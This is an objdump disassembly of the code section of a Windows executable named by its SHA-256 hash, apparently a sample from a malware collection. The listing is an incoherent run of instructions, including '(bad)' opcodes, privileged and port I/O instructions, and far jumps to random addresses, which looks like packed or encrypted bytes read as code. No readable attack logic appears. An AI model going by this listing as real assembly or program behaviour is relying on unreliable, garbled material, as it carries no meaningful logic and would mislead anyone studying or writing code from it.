
b4ab76f7bb92b25726076c2b925a4c841f0510f015d09e713bafd4f95395c865.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	ins    DWORD PTR es:[edi],dx
  401001:	sub    BYTE PTR [ecx-0x180d0525],dh
  401007:	int    0xb9
  401009:	outs   dx,DWORD PTR ds:[esi]
  40100a:	cmp    DWORD PTR [ebx-0x2a],esi
  40100d:	in     al,0x77
  40100f:	pop    eax
  401010:	sahf   
  401011:	xlat   BYTE PTR ds:[ebx]
  401012:	push   edi
  401013:	and    dl,BYTE PTR [ebx]
  401015:	ret    0x5aa0
  401018:	inc    esp
  401019:	mov    ch,0x2e
  40101b:	aaa    
  40101c:	xor    eax,DWORD PTR [edx+0x4fd94919]
  401022:	xchg   esp,eax
  401023:	fsub   st,st(3)
  401025:	mov    esp,0x56b773c8
  40102a:	xchg   ecx,eax
  40102b:	jg     0x401016
  40102d:	adc    al,cl
  40102f:	test   al,0xb6
  401031:	clc    
  401032:	fdiv   st,st(6)
  401034:	or     ebp,DWORD PTR cs:[ecx+0x6a251fc5]
  40103b:	dec    eax
  40103c:	xchg   edx,eax
  40103d:	push   ds
  40103e:	mov    ds:0xdc9e6c0,al
  401043:	mov    ecx,DWORD PTR [edi+0x3c]
  401046:	repz xlat BYTE PTR ds:[ebx]
  401048:	mov    ebp,0x8b21e5
  40104d:	pop    esp
  40104e:	mov    WORD PTR [ebp+0x31],ss
  401051:	and    al,0xa8
  401053:	rcl    ebx,1
  401055:	into   
  401056:	fnsave [eax]
  401058:	cmp    ah,BYTE PTR fs:[eax+ebp*2+0x4a]
  40105d:	rol    DWORD PTR [esi+ecx*4-0x5b],1
  401061:	pop    eax
  401062:	adc    BYTE PTR [ecx-0x717f6c54],al
  401068:	out    dx,al
  401069:	in     al,0x60
  40106b:	ret    0xe675
  40106e:	call   0xd823741b
  401073:	xor    eax,0x9be0a95f
  401078:	dec    eax
  401079:	ss in  al,0x81
  40107c:	lods   al,BYTE PTR ds:[esi]
  40107d:	and    eax,0x4e9b7f99
  401082:	add    edx,DWORD PTR [esi+ebx*1-0x3bbf7548]
  401089:	dec    ebx
  40108a:	push   ds
  40108b:	mov    esi,0xfb96dd3e
  401090:	xchg   ecx,eax
  401091:	lods   al,BYTE PTR ds:[esi]
  401092:	addr16 cdq 
  401094:	dec    eax
  401095:	rcl    DWORD PTR [ebx],1
  401097:	mov    edx,0xefdb8f40
  40109c:	jns    0x4010ff
  40109e:	mov    esi,0xb623ab07
  4010a3:	xchg   esp,eax
  4010a4:	xchg   ch,dh
  4010a6:	push   es
  4010a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010a8:	sub    eax,0x10059d06
  4010ad:	(bad)  
  4010ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010af:	clc    
  4010b0:	mov    esi,DWORD PTR [esi-0x31]
  4010b3:	imul   eax
  4010b5:	mov    eax,ds:0x139ae33e
  4010ba:	cmp    BYTE PTR cs:[ebx],bl
  4010bd:	pop    ss
  4010be:	rcr    ch,1
  4010c0:	pop    ss
  4010c1:	fisttp WORD PTR [edi+0x48]
  4010c4:	mov    dl,0xd3
  4010c6:	pusha  
  4010c7:	mov    al,0xeb
  4010c9:	lock (bad) 
  4010cb:	scas   al,BYTE PTR es:[edi]
  4010cc:	addr16 xchg esi,eax
  4010ce:	fldenv [ecx]
  4010d0:	mov    al,ds:0x7ffb4511
  4010d5:	adc    BYTE PTR [ebx-0x6c71e47c],ah
  4010db:	pop    es
  4010dc:	mov    al,0xe4
  4010de:	xchg   ebp,eax
  4010df:	test   BYTE PTR [edi],al
  4010e1:	add    al,0xd6
  4010e3:	sbb    ebp,DWORD PTR ds:0x268e876a
  4010e9:	ja     0x4010fa
  4010eb:	mov    al,0xb6
  4010ed:	sub    ch,BYTE PTR [ebp-0x782a309d]
  4010f3:	dec    ecx
  4010f4:	or     ebx,eax
  4010f6:	mov    ebp,cr3
  4010f9:	pop    esp
  4010fa:	das    
  4010fb:	pop    ecx
  4010fc:	jle    0x4010f2
  4010fe:	pop    esi
  4010ff:	jecxz  0x4010bf
  401101:	popa   
  401102:	or     al,0x4e
  401104:	mov    edi,0x1e1a2e45
  401109:	mov    eax,ds:0x9a98bb57
  40110e:	or     eax,0x853d6906
  401113:	pop    ebx
  401114:	add    DWORD PTR ds:[ebp-0x7b653f29],eax
  40111b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40111c:	mov    edx,0x4c33e07
  401121:	jns    0x40117e
  401123:	push   es
  401124:	(bad)  
  401125:	mov    ds:0x7733908b,al
  40112a:	dec    edi
  40112b:	xchg   ebx,eax
  40112c:	cli    
  40112d:	fadd   QWORD PTR [edi+ebp*8+0x7a]
  401131:	mov    bl,0xe2
  401133:	mov    cl,0x89
  401135:	in     al,0x3
  401137:	sub    DWORD PTR [edi+0x429daa43],eax
  40113d:	lods   eax,DWORD PTR ds:[esi]
  40113e:	mov    cl,0x7f
  401140:	xor    BYTE PTR ds:0x24372149,ch
  401146:	rcr    bh,cl
  401148:	adc    DWORD PTR [ecx+ebx*4],esp
  40114b:	xor    esp,ebp
  40114d:	jmp    0x4d6d:0xf0feef4a
  401154:	push   0x54
  401156:	sub    esp,esi
  401158:	jbe    0x4011bc
  40115a:	mov    ds:0xfb280646,al
  40115f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401160:	mov    eax,DWORD PTR ss:[ebx+0xf]
  401164:	ret    0x185d
  401167:	sahf   
  401168:	ja     0x40111f
  40116a:	mov    ebp,0xa43b3635
  40116f:	add    eax,0x115ad6ea
  401174:	pop    esi
  401175:	jne    0x401132
  401177:	fstp   DWORD PTR [edx-0x64]
  40117a:	and    DWORD PTR [ebx+0x4a],ebx
  40117d:	pop    ebx
  40117e:	test   BYTE PTR [ecx-0xa],ch
  401181:	loopne 0x40112e
  401183:	in     al,0xce
  401185:	push   ecx
  401186:	ss mov ah,0x2d
  401189:	dec    edx
  40118a:	icebp  
  40118b:	sub    al,0x63
  40118d:	stos   DWORD PTR es:[edi],eax
  40118e:	pusha  
  40118f:	fidivr DWORD PTR [ebx+0xb13a4c0]
  401195:	sub    cl,al
  401197:	jg     0x4011c0
  401199:	dec    edi
  40119a:	and    ecx,ecx
  40119c:	jmp    0x39f775fd
  4011a1:	(bad)  
  4011a2:	(bad)  
  4011a3:	popa   
  4011a4:	xor    bl,dl
  4011a6:	aas    
  4011a7:	pop    ecx
  4011a8:	call   0x87d8ab95
  4011ad:	xchg   esi,eax
  4011ae:	xor    BYTE PTR [eax-0x67f677a0],ch
  4011b4:	and    eax,0xf1c0b848
  4011b9:	out    0xcb,eax
  4011bb:	mov    ah,0x40
  4011bd:	ret    0xab37
  4011c0:	and    BYTE PTR [ecx+ebx*4+0x105d2e54],al
  4011c7:	aad    0xb9
  4011c9:	aaa    
  4011ca:	pusha  
  4011cb:	jae    0x401189
  4011cd:	dec    ebx
  4011ce:	arpl   WORD PTR [edi+0x3d],sp
  4011d1:	cmp    bh,dh
  4011d3:	pop    edx
  4011d4:	add    edi,DWORD PTR [esi-0x7f6c03c9]
  4011da:	mov    eax,ds:0xed1830b7
  4011df:	outs   dx,BYTE PTR ds:[esi]
  4011e0:	cld    
  4011e1:	jecxz  0x4011d4
  4011e3:	xchg   ecx,eax
  4011e4:	and    BYTE PTR [ebp+ebp*1-0x76],al
  4011e8:	rcl    BYTE PTR [edi],1
  4011ea:	or     DWORD PTR [edx-0x35e64405],edx
  4011f0:	push   edi
  4011f1:	test   BYTE PTR [ebx+ecx*8-0x25],cl
  4011f5:	jo     0x401243
  4011f7:	lods   al,BYTE PTR ds:[esi]
  4011f8:	xor    al,0xa3
  4011fa:	add    dl,dl
  4011fc:	xchg   ebx,eax
  4011fd:	rol    BYTE PTR [ebx],0x3d
  401200:	fisttp WORD PTR [ecx+ebx*8-0x3e6f9210]
  401207:	pop    ebp
  401208:	or     BYTE PTR [ecx+0x478227b1],0x7d
  40120f:	cmp    DWORD PTR [edi+0x6023a3fe],esi
  401215:	xor    esi,esi
  401217:	pop    ds
  401218:	ret    0xc39e
  40121b:	or     DWORD PTR [edx-0x60],edx
  40121e:	(bad)
  401221:	pop    ds
  401222:	cmp    eax,eax
  401224:	cld    
  401225:	(bad)  
  401227:	pop    esp
  401228:	popa   
  401229:	in     eax,0x29
  40122b:	icebp  
  40122c:	sbb    DWORD PTR [ebx-0x28],edi
  40122f:	mov    bl,0x13
  401231:	ja     0x401217
  401233:	push   0xffffffcc
  401235:	inc    ebx
  401236:	sbb    eax,0x746c7164
  40123b:	mov    bh,ah
  40123d:	xor    BYTE PTR ds:0x597e07f7,ah
  401243:	hlt    
  401244:	jae    0x4011d7
  401246:	push   ecx
  401247:	pop    ebp
  401248:	enter  0xffd5,0x83
  40124c:	popa   
  40124d:	imul   ebx
  40124f:	adc    ah,BYTE PTR [edx+0x548a7dce]
  401255:	rcl    BYTE PTR [edi+0x31],0xe0
  401259:	retf   0x9407
  40125c:	xchg   BYTE PTR [eax-0x6c],dh
  40125f:	enter  0x147,0x95
  401263:	(bad)  
  401264:	push   0xffffffd4
  401266:	dec    ebx
  401267:	push   cs
  401268:	inc    ebx
  401269:	inc    ecx
  40126a:	cwde   
  40126b:	push   esi
  40126c:	mov    dh,0xb7
  40126e:	mov    ds:0x15e15f0c,eax
  401273:	pop    edx
  401274:	mov    ebx,0xe3f4c469
  401279:	fmul   QWORD PTR [edx+esi*8]
  40127c:	idiv   DWORD PTR [esi+ecx*2]
  40127f:	or     DWORD PTR [edi+0x66],edx
  401282:	jmp    0xa8eab4cc
  401287:	adc    cl,BYTE PTR [esi+0x23]
  40128a:	imul   edi,DWORD PTR [edx+0x3b9c2671],0x29386905
  401294:	and    dl,0xf4
  401297:	sub    BYTE PTR [edi-0x12],dh
  40129a:	js     0x4012e9
  40129c:	mov    ebp,edx
  40129e:	imul   ebx,DWORD PTR [edx-0x152f399f],0xfc4b500e
  4012a8:	sbb    eax,0x82bbdb45
  4012ad:	lods   al,BYTE PTR ds:[esi]
  4012ae:	lea    ecx,[ecx-0x5a]
  4012b1:	fdivrp st(4),st
  4012b3:	hlt    
  4012b4:	bound  edx,QWORD PTR [esi+0x39]
  4012b7:	scas   al,BYTE PTR es:[edi]
  4012b8:	sbb    BYTE PTR [ecx],ah
  4012ba:	push   edi
  4012bb:	scas   al,BYTE PTR es:[edi]
  4012bc:	inc    esi
  4012bd:	inc    edi
  4012be:	xchg   edi,eax
  4012bf:	pop    es
  4012c0:	cmp    BYTE PTR [esi+0x6c39358e],dl
  4012c6:	sahf   
  4012c7:	jmp    0x401311
  4012c9:	sti    
  4012ca:	mov    ebp,0xc1503ee4
  4012cf:	fmul   QWORD PTR [ebx]
  4012d1:	fcomp  DWORD PTR [esi-0x4e]
  4012d4:	cmp    dh,dl
  4012d6:	mov    ecx,DWORD PTR [eax+0x29feb071]
  4012dc:	and    ah,al
  4012de:	dec    ecx
  4012df:	xor    cl,ch
  4012e1:	xchg   BYTE PTR [eax+edx*2],ah
  4012e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012e5:	loope  0x4012e7
  4012e7:	rol    DWORD PTR [ebx],cl
  4012e9:	mov    al,0xb4
  4012eb:	mov    eax,ds:0x5623a628
  4012f0:	push   eax
  4012f1:	bound  ecx,QWORD PTR [ecx+0x2426bd73]
  4012f7:	imul   ebx,DWORD PTR [si+0x626d],0xb33f152d
  401300:	pop    ebx
  401301:	call   0x2bfb:0x7e88b97c
  401308:	xor    al,0xbe
  40130a:	jle    0x401342
  40130c:	mov    esi,0x90464899
  401311:	clc    
  401312:	fisub  DWORD PTR [edx]
  401314:	mov    ah,0x66
  401316:	mov    dh,0xae
  401318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401319:	ret    0xff6e
  40131c:	cwde   
  40131d:	mov    esp,0xc140aaa3
  401322:	lods   eax,DWORD PTR ds:[esi]
  401323:	cs jg  0x40133b
  401326:	mov    edi,0x1763151c
  40132b:	jmp    0xd916:0x6c5a1b88
  401332:	lock cld 
  401334:	mov    eax,ds:0x69a91856
  401339:	into   
  40133a:	shr    DWORD PTR [ebp-0x1c],cl
  40133d:	dec    edi
  40133e:	rcl    BYTE PTR [eax+0x26],0x61
  401342:	jae    0x4013b0
  401344:	imul   BYTE PTR [ecx+edx*4]
  401347:	adc    DWORD PTR [ebx+eiz*2-0x79aaf0cc],ebx
  40134e:	js     0x4012ed
  401350:	mov    ds:0x88a150a7,al
  401355:	je     0x401363
  401357:	js     0x401311
  401359:	imul   DWORD PTR [edx-0x7188d78c]
  40135f:	lock retf 0xe038
  401363:	and    BYTE PTR [edi],0x3c
  401366:	mov    ebp,DWORD PTR [ebp+0x69]
  401369:	xchg   esp,eax
  40136a:	(bad)  
  40136b:	fistp  DWORD PTR [esi]
  40136d:	(bad)  
  40136e:	jg     0x401309
  401370:	xchg   ebp,eax
  401371:	cdq    
  401372:	pop    ds
  401373:	xchg   DWORD PTR [edi+0x7ceae674],edx
  401379:	int3   
  40137a:	test   BYTE PTR ds:[ebx+0x2f],dl
  40137e:	inc    edx
  40137f:	jno    0x4013dc
  401381:	mov    al,ds:0xb4cc5e0b
  401386:	push   esi
  401387:	test   DWORD PTR [ebx+0x49148255],eax
  40138d:	push   0x60
  40138f:	or     DWORD PTR [esi+0x66],ecx
  401392:	sbb    eax,0x3314335a
  401397:	out    0x9d,eax
  401399:	xor    DWORD PTR [edx-0x448a0f23],eax
  40139f:	(bad)  
  4013a1:	mov    ebp,0x93e1b499
  4013a6:	inc    ecx
  4013a7:	pop    esp
  4013a8:	inc    ebx
  4013a9:	xor    BYTE PTR [ecx+0x75c5aa62],bh
  4013af:	jge    0x401410
  4013b1:	push   ds
  4013b2:	mov    DWORD PTR [eax],edx
  4013b4:	sbb    ecx,DWORD PTR [ecx-0x47794991]
  4013ba:	leave  
  4013bb:	cli    
  4013bc:	stos   BYTE PTR es:[edi],al
  4013bd:	inc    edi
  4013be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013bf:	jge    0x4013f0
  4013c1:	ins    BYTE PTR es:[edi],dx
  4013c2:	hlt    
  4013c3:	in     al,0x8a
  4013c5:	adc    edi,esi
  4013c7:	adc    bh,BYTE PTR [edi+0x66a45518]
  4013cd:	out    dx,eax
  4013ce:	jmp    0xcfd7:0xf959adac
  4013d5:	jecxz  0x401391
  4013d7:	mov    ds:0x2c436715,eax
  4013dc:	paddusw mm7,QWORD PTR [esi+0x6a381388]
  4013e3:	ins    BYTE PTR es:[edi],dx
  4013e4:	pop    esp
  4013e5:	push   esi
  4013e6:	mov    esi,0x8f8c9be0
  4013eb:	mov    al,0xa8
  4013ed:	mov    dh,0x4
  4013ef:	push   edi
  4013f0:	jae    0x40146c
  4013f2:	(bad)  
  4013f3:	test   edi,ebx
  4013f5:	mov    bh,0x1
  4013f7:	stos   DWORD PTR es:[edi],eax
  4013f8:	ret    0x11db
  4013fb:	fidivr WORD PTR [edi+0x79]
  4013fe:	ins    DWORD PTR es:[edi],dx
  4013ff:	arpl   WORD PTR ds:0x21770bd7,bx
  401405:	cld    
  401406:	or     BYTE PTR [ebx+0x2b],cl
  401409:	sub    DWORD PTR [esi+0x47a37c4b],ecx
  40140f:	js     0x40146d
  401411:	cmp    bl,BYTE PTR [eax-0x37]
  401414:	hlt    
  401415:	int    0xf7
  401417:	jmp    0xca2b855c
  40141c:	jmp    0x89611382
  401421:	call   0xe0e6:0x3882d02b
  401428:	xchg   edi,eax
  401429:	mov    al,ds:0xe0101cb6
  40142e:	push   ebp
  40142f:	ret    
  401430:	int    0x3
  401432:	gs iret 
  401434:	mov    edx,0x7370340b
  401439:	mov    bh,0xf3
  40143b:	jb     0x40140c
  40143d:	imul   eax,DWORD PTR [esi+0x4975d686],0x3f
  401444:	cmp    BYTE PTR [edi],bl
  401446:	leave  
  401447:	enter  0x404,0x48
  40144b:	enter  0xb588,0xa6
  40144f:	or     BYTE PTR [eax+ecx*8-0x7c218194],ah
  401456:	push   esi
  401457:	mov    eax,ecx
  401459:	pop    edx
  40145a:	icebp  
  40145b:	mov    ds:0x7ff0a4c6,al
  401460:	adc    BYTE PTR [ecx],0xd7
  401463:	push   0x67
  401465:	inc    ebx
  401466:	pop    ebx
  401467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401468:	sub    dh,dh
  40146a:	ret    
  40146b:	bound  ecx,QWORD PTR [esi+0x6d]
  40146e:	repnz in al,0x4
  401471:	les    esi,FWORD PTR [ebp-0x5ed4422b]
  401477:	pop    esp
  401478:	ds push edx
  40147a:	cmp    BYTE PTR [ebx+0x3e],dh
  40147d:	inc    esp
  40147e:	add    cl,BYTE PTR ds:0xbc8f9dfc
  401484:	sbb    DWORD PTR [eax+0x1],ebx
  401487:	sub    al,0x26
  401489:	jge    0x401440
  40148b:	xchg   esi,eax
  40148c:	jg     0x401483
  40148e:	push   0xffffff80
  401490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401491:	daa    
  401492:	repnz xchg esp,eax
  401494:	mov    ds:0x8e8a2265,al
  401499:	dec    eax
  40149a:	push   edi
  40149b:	pop    eax
  40149c:	adc    ch,bl
  40149e:	test   al,0x35
  4014a0:	dec    esp
  4014a1:	sar    dl,cl
  4014a3:	push   ds
  4014a4:	sub    eax,0xac2d57fd
  4014a9:	xor    ebx,DWORD PTR [ebx]
  4014ab:	rcl    DWORD PTR [edx+0x33364848],cl
  4014b1:	add    al,BYTE PTR [edx]
  4014b3:	in     al,0xbb
  4014b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014b6:	sbb    ecx,DWORD PTR [esi]
  4014b8:	push   esi
  4014b9:	and    BYTE PTR [edi+0x59],0xe4
  4014bd:	adc    BYTE PTR [ecx],dl
  4014bf:	xor    eax,0xa3d8a7b4
  4014c4:	sahf   
  4014c5:	dec    edx
  4014c6:	xor    al,0xcb
  4014c8:	ins    BYTE PTR es:[edi],dx
  4014c9:	dec    ecx
  4014ca:	imul   BYTE PTR [ebp-0x3e]
  4014cd:	pop    esp
  4014ce:	pop    edi
  4014cf:	lea    esi,[edx]
  4014d1:	jae    0x401453
  4014d3:	retf   0x49db
  4014d6:	daa    
  4014d7:	push   cs
  4014d8:	dec    edi
  4014d9:	adc    DWORD PTR [esi+0x74445d4],0xf
  4014e0:	je     0x40155e
  4014e2:	sahf   
  4014e3:	jg     0x4014d0
  4014e5:	movd   ecx,mm1
  4014e8:	add    ebx,DWORD PTR [eax]
  4014ea:	pusha  
  4014eb:	add    ebp,DWORD PTR [ebx]
  4014ed:	xchg   esi,eax
  4014ee:	add    esp,DWORD PTR [edi+ebx*1+0x75]
  4014f2:	stc    
  4014f3:	and    dl,BYTE PTR [edi]
  4014f5:	fstp   QWORD PTR [ecx+0x68]
  4014f8:	test   BYTE PTR [ebx],ah
  4014fa:	inc    ecx
  4014fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014fc:	fild   WORD PTR [esi+edi*2]
  4014ff:	mov    DWORD PTR [ecx],eax
  401501:	sub    BYTE PTR [ebp-0x45b7fa4c],bl
  401507:	iret   
  401508:	add    dl,BYTE PTR [eax]
  40150a:	pop    edx
  40150b:	cmp    eax,0xa37a6e0a
  401510:	dec    esp
  401511:	fucomip st,st(2)
  401513:	fdivr  DWORD PTR ds:0xafaa64d5
  401519:	pop    esp
  40151a:	mov    ds:0x40cfa8a6,eax
  40151f:	jp     0x4014df
  401521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401522:	mov    edx,0xaa8ee278
  401527:	test   DWORD PTR [eax],ecx
  401529:	mov    gs,WORD PTR [ebx]
  40152b:	xor    ch,BYTE PTR [ebp*1-0x67758ede]
  401532:	test   al,0x73
  401534:	mov    edx,0x70b8f0d8
  401539:	popa   
  40153a:	bound  edx,QWORD PTR [edi-0x6b0873a9]
  401540:	xchg   ebx,eax
  401541:	push   esi
  401542:	sub    DWORD PTR ds:0x4df71e1c,ecx
  401548:	cs sbb al,0xc3
  40154b:	and    al,al
  40154d:	jmp    0x9848aa3a
  401552:	retf   
  401553:	dec    eax
  401554:	mov    dl,0x8c
  401556:	push   ebp
  401557:	test   ch,cl
  401559:	cwde   
  40155a:	mov    esi,0x3745929
  40155f:	mov    al,bh
  401561:	dec    ebx
  401562:	pop    edi
  401563:	ficom  DWORD PTR [edx]
  401565:	xchg   ecx,eax
  401566:	jp     0x4015ac
  401568:	das    
  401569:	popa   
  40156a:	xchg   edx,eax
  40156b:	and    eax,0xa1b664f4
  401570:	inc    BYTE PTR [ecx-0x1f]
  401573:	mov    dh,0x19
  401575:	out    0xa7,al
  401577:	jb     0x40154d
  401579:	sbb    DWORD PTR [ebx],0x54e463ff
  40157f:	xor    ebx,esi
  401581:	pop    es
  401582:	and    DWORD PTR [eax],esi
  401584:	call   0x910c0155
  401589:	je     0x40151b
  40158b:	loope  0x40153b
  40158d:	mul    dl
  40158f:	hlt    
  401590:	mov    ch,0xf1
  401592:	and    al,0x8b
  401594:	ins    DWORD PTR es:[edi],dx
  401595:	jmp    FWORD PTR [edx+0x5af90447]
  40159b:	jb     0x40156e
  40159d:	push   0x3aea8223
  4015a2:	jnp    0x4015b9
  4015a4:	call   0xe941:0x89d9e57e
  4015ab:	sti    
  4015ac:	or     DWORD PTR [ecx-0x26],ebp
  4015af:	jo     0x401625
  4015b1:	push   esp
  4015b2:	pop    edx
  4015b3:	shr    eax,1
  4015b5:	outs   dx,BYTE PTR ds:[esi]
  4015b6:	mov    ah,0xb7
  4015b8:	sbb    edi,edx
  4015ba:	ja     0x40163a
  4015bc:	out    0x21,al
  4015be:	(bad)  
  4015c0:	jge    0x4015cb
  4015c2:	and    DWORD PTR [ebx],ebx
  4015c4:	xor    DWORD PTR [esi+0x3a],ebx
  4015c7:	cmp    BYTE PTR [ebx+0x5f],dl
  4015ca:	lock sub BYTE PTR [edx+0x4f8c47b4],cl
  4015d1:	dec    ebp
  4015d2:	jmp    0xf97d7fe
  4015d7:	lods   eax,DWORD PTR ds:[esi]
  4015d8:	icebp  
  4015d9:	popf   
  4015da:	aad    0x70
  4015dc:	pop    ds
  4015dd:	mov    al,ds:0x20d5ef3
  4015e2:	jnp    0x40158b
  4015e4:	test   eax,0x11efc5fd
  4015e9:	and    edi,DWORD PTR [ebx+ebx*1-0x43]
  4015ed:	dec    edx
  4015ee:	scas   al,BYTE PTR es:[edi]
  4015ef:	es pusha 
  4015f1:	xor    esi,DWORD PTR [edi+ecx*2]
  4015f4:	mov    eax,ds:0xaef1784e
  4015f9:	ror    DWORD PTR [edi],1
  4015fb:	imul   edi,DWORD PTR [edi],0x15e642f9
  401601:	mov    bl,0x81
  401603:	xchg   eax,edi
  401605:	pop    esp
  401606:	mov    ch,0xb3
  401608:	out    0xcd,al
  40160a:	inc    esp
  40160b:	aaa    
  40160c:	inc    ecx
  40160d:	push   ss
  40160e:	sub    DWORD PTR [eax+0x3ce18a80],edx
  401614:	or     al,0x35
  401616:	mov    BYTE PTR [ebp+0x6903c6f6],ch
  40161c:	and    DWORD PTR [eax+0x14],edx
  40161f:	push   ebp
  401620:	sub    al,0xe9
  401622:	push   edx
  401623:	fsub   QWORD PTR [ebp+eiz*2+0x50]
  401627:	xchg   esp,eax
  401628:	mov    al,ds:0xf44f5c47
  40162d:	mov    ds:0x933e3dec,eax
  401632:	repnz pop ecx
  401634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401635:	cmp    ch,bh
  401637:	jae    0x4015be
  401639:	(bad)  
  40163a:	sti    
  40163b:	xchg   ebp,eax
  40163c:	jge    0x401632
  40163e:	aaa    
  40163f:	sbb    DWORD PTR [edx-0x23],ebx
  401642:	cmc    
  401643:	fnstsw WORD PTR [ecx+0x2e5f707c]
  401649:	int3   
  40164a:	inc    eax
  40164b:	inc    ebp
  40164c:	ja     0x401604
  40164e:	les    esi,FWORD PTR [edx+0x661d7d0c]
  401654:	xchg   ebp,eax
  401655:	cmp    al,0x5c
  401657:	xor    BYTE PTR ds:0x2ef5c5f,0x71
  40165e:	retf   0x97bf
  401661:	sar    BYTE PTR [ebp+edx*4-0x6],1
  401665:	cmp    bh,BYTE PTR [ebx-0x6c]
  401668:	or     eax,0x3c20e027
  40166d:	inc    ebp
  40166e:	(bad)  
  40166f:	jae    0x40166d
  401671:	pop    ds
  401672:	loope  0x40168f
  401674:	add    al,0xcf
  401676:	inc    esi
  401677:	in     al,0x38
  401679:	sub    DWORD PTR [esi],0xc7c0b6a7
  40167f:	jmp    0x401642
  401681:	jns    0x4016b5
  401683:	dec    ebx
  401684:	shl    BYTE PTR [ebp+0x53],0xd1
  401688:	hlt    
  401689:	inc    ebx
  40168a:	adc    al,0xfa
  40168c:	cwde   
  40168d:	adc    ebx,esp
  40168f:	jecxz  0x401615
  401691:	jbe    0x40162a
  401693:	mov    ch,0xf8
  401695:	cli    
  401696:	sahf   
  401697:	mov    ebx,0x87264ef0
  40169c:	and    esp,DWORD PTR [edi]
  40169e:	test   bl,0xd7
  4016a1:	push   cs
  4016a2:	sbb    eax,0x2284484
  4016a7:	adc    bh,BYTE PTR [edx+0x360c3246]
  4016ad:	(bad)  
  4016ae:	pop    ebp
  4016af:	jmp    0x59190959
  4016b4:	outs   dx,BYTE PTR ds:[esi]
  4016b5:	in     al,0xb6
  4016b7:	rcl    DWORD PTR [edi+0x4679e42],1
  4016bd:	pop    ebx
  4016be:	dec    edx
  4016bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c0:	inc    ecx
  4016c1:	test   eax,0x2f6d160b
  4016c6:	pop    eax
  4016c7:	add    bl,BYTE PTR ds:0x2c7a4fc5
  4016cd:	mov    dh,0xda
  4016cf:	test   al,0x21
  4016d1:	mov    al,ds:0xdadcf293
  4016d6:	test   eax,0xfd6d5aa2
  4016db:	adc    BYTE PTR [ebp+0x2d2db901],0xed
  4016e2:	test   al,0x80
  4016e4:	bound  esp,QWORD PTR [ebx+0x684f52c6]
  4016ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016eb:	jge    0x401739
  4016ed:	sti    
  4016ee:	out    dx,eax
  4016ef:	adc    ah,BYTE PTR [eax]
  4016f1:	push   ds
  4016f2:	fldcw  WORD PTR [ecx+edx*1+0x5b]
  4016f6:	jnp    0x401744
  4016f8:	push   es
  4016f9:	rcl    ebx,cl
  4016fb:	jae    0x401750
  4016fd:	aad    0x52
  4016ff:	rol    DWORD PTR [ebp+edi*8+0x77],1
  401703:	sub    bh,ah
  401705:	daa    
  401706:	pop    ebp
  401707:	jno    0x401731
  401709:	xchg   ecx,eax
  40170a:	xchg   edi,ecx
  40170c:	cs pop edi
  40170e:	sbb    edi,DWORD PTR [eax+0x21]
  401711:	shl    DWORD PTR ds:0xcf346366,1
  401717:	xchg   edx,eax
  401718:	cmp    WORD PTR [ebp+edx*2+0x3a00f1d2],0xfdbb
  401722:	and    ch,BYTE PTR [edx+0x49]
  401725:	or     BYTE PTR [ebx+0x2be80ac0],0xaf
  40172c:	repz loope 0x4016ff
  40172f:	leave  
  401730:	stos   BYTE PTR es:[edi],al
  401731:	add    BYTE PTR [esi],bh
  401733:	jecxz  0x401752
  401735:	sub    eax,0xe7c5aa0e
  40173a:	mov    ebp,0xf6a72b05
  40173f:	loopne 0x4016ca
  401741:	push   ebp
  401742:	mov    eax,0xd7fe14f9
  401747:	sub    eax,DWORD PTR [eax]
  401749:	or     eax,0x9c03af62
  40174e:	jle    0x401793
  401750:	mov    bh,0x3b
  401752:	ins    DWORD PTR es:[edi],dx
  401753:	nop
  401754:	pop    edi
  401755:	mov    bh,0x1f
  401757:	repz imul DWORD PTR [edx]
  40175a:	fs ret 0x18ba
  40175e:	call   0x8acd:0x21dcc545
  401765:	ja     0x4017b9
  401767:	sub    al,BYTE PTR [ebp-0x8]
  40176a:	jns    0x4017bc
  40176c:	push   esi
  40176d:	ja     0x401785
  40176f:	gs loopne 0x40176e
  401772:	out    dx,al
  401773:	xor    DWORD PTR [ebp-0x63],eax
  401776:	aaa    
  401777:	or     ecx,edx
  401779:	adc    ebp,DWORD PTR [esi+0x7f]
  40177c:	sbb    eax,DWORD PTR [ecx]
  40177e:	inc    eax
  40177f:	fiadd  WORD PTR [edx]
  401781:	scas   al,BYTE PTR es:[edi]
  401782:	in     al,dx
  401783:	popf   
  401784:	mov    ds:0xe4bb019a,al
  401789:	in     al,dx
  40178a:	loope  0x40173b
  40178c:	test   al,0xc8
  40178e:	adc    bh,BYTE PTR [ecx-0x3b7c2d6]
  401794:	push   ecx
  401795:	pop    ss
  401796:	sbb    BYTE PTR [esi-0x38],bl
  401799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40179a:	arpl   WORD PTR [edx-0x4daa6e25],sp
  4017a0:	sar    eax,0x31
  4017a3:	or     al,0x96
  4017a5:	mov    ds,esi
  4017a7:	pusha  
  4017a8:	mov    dl,0x8d
  4017aa:	dec    esi
  4017ab:	outs   dx,DWORD PTR ds:[esi]
  4017ac:	jae    0x4017df
  4017ae:	pop    esi
  4017af:	xor    eax,0x5f43c21e
  4017b4:	push   esp
  4017b5:	(bad)  
  4017b6:	out    0x78,al
  4017b8:	push   ebx
  4017b9:	cmp    al,0xde
  4017bb:	pop    ds
  4017bc:	retf   0x997b
  4017bf:	jnp    0x40182b
  4017c1:	adc    dl,bl
  4017c3:	or     al,0x5b
  4017c5:	mov    BYTE PTR [ebp-0x615ada84],ch
  4017cb:	cmc    
  4017cc:	dec    ecx
  4017cd:	cli    
  4017ce:	jbe    0x4017e7
  4017d0:	sbb    ah,BYTE PTR [edi+0x7d]
